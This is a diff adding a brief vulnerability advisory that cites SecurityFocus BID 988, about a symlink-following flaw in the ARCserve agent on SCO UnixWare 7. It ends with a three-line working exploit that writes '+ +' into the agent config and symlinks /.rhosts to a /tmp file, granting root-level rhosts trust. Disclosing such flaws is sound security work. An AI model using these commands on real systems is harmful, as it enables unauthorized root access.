@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/988/info
+
+A symlink following vulnerability exists in the ARCserve agent, as shipped with SCO Unixware 7. Upon startup, the asagent program will create several files in /tmp. These are created mode 777, and can be removed and replaced by any user on the system. If these are replaced with symlinks, files can be created anywhere on the filesystem, owned by root. This cannot be used to alter the permissions of existing files. However, the contents of the new file are contained in /usr/CYEagent/agent.cfg. This file is world writable. 
+
+echo "+ +" > /usr/CYEagent/agent.cfg
+rm /tmp/asagent.tmp
+ln -sf /.rhosts /tmp/asagent.tmp
+
